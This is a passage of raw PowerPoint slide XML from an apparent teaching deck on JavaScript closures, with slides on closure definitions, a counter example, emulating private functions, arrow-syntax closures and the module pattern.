            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The nested inner function must refer to a value defined in the enclosing function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="971550" lvl="1" indent="-514350">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>The enclosing function must return the nested inner function.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Closure means that an inner function always has access to the local variables and parameters of its outer function, even after the outer function has returned. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>In JavaScript closures are created every time a function is created at function creation time.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Closures can avoid the use of global values and provides some form of data hiding aka encapsulation e.g. making a "private" variable or a function. Common use of closures is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>the module pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23322812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68199E4-7B8F-4915-B349-FF89CA9160B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Closure Example</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4245E5DD-9516-4F2B-807B-591617E1A305}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="5141168"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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function</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>counter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">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init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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n</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>init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err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> () </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;</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n</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above</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line</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as </a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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return</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function</a:t>
            </a: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increase</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>() {</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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return</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> n++;</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        } */</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>counter</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c</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0</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c</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1</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c</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2</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c2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>counter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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c2</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10</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI" sz="1800" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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console</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log</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>c2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>()); </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1800" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// 11</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI"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6736811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6F5C441-0A1A-42B3-9AA7-BE8225491ADB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="274638"/>
            <a:ext cx="10972800" cy="922114"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Using Closure to Emulate Private Function</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4E77F907-60D5-4BC0-B7B9-569587215B99}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="590003" y="1223493"/>
            <a:ext cx="10972800" cy="5400600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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var</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counter</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var</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privateCounter</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changeBy</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privateCounter</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val</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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increment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ()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changeBy</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decrement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ()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changeBy</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value</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1400" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> ()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privateCounter</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>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0</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increment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increment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2</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decrement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1</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privateCounter</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undefined</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counter</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changeBy</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2</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fails</a:t>
            </a:r>
            <a:endParaRPr lang="fi-FI"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551899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9E9DA58-68D2-4358-8A3E-666EBC705763}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Arrow Syntax Makes Closures Compact</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8CB58486-EFE8-40BF-9823-2B6BC33F0301}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4925144"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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multiplier</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multiply</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y</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</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y</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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>return</a:t>
            </a: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multiply</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same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as:</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var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multiplier</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y</a:t>
            </a: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x</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y</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>multiplier</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</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m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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m</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22171504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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1D5605A-2F9B-40F5-9F8D-0A9537BFB907}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Simplified Module Pattern</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI" dirty="0"/>
              <a:t>with no information hiding</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E4014D0-7A96-4D4D-BD8B-B52639F281C8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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Very</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simple</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pattern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>avoid</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polluting</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global</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name</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space</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using</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objects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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Works </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>with</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any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>browser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</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r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a: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myModule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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variableName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a: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variableValue</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err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>functionName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
